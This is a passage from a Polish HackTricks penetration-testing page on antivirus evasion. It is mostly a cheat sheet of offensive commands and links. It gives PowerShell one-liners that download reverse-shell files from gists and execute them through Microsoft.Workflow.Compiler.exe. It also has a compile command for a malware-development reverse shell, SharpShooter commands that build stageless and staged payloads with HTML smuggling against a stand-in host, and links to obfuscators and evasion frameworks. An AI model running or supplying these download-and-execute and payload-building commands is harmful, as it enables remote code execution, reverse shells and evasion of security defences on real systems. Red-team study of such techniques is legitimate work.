[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korzystanie z pythona do budowy przykładowych wstrzykiwaczy:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
